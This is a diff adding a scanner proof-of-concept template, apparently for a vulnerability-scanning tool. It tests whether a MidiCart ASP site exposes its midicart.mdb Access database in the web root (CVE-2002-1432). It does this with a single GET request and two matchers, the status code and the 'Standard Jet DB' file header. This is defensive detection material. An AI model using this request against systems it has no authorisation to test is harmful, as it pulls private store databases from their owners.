@@ -1,0 +1,35 @@
+[info]
+author = "ave"
+description = "验证 MidiCart ASP 是否将 midicart.mdb 数据库文件直接暴露于 Web 根目录。通过 HTTP GET 请求该文件，若返回 200 且响应体包含 Microsoft Access 数据库文件头特征 'Standard Jet DB'，则确认存在敏感信息泄露漏洞（CVE-2002-1432）。"
+id = "POC-AVE-2002-0585"
+name = "CVE-2002-1432 PoC"
+severity = "medium"
+tags = ["cve-2002-1432"]
+vuln_id = [
+    "CVE-2002-1432",
+    "AVE-2002-0585",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/midicart.mdb"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Standard Jet DB"]
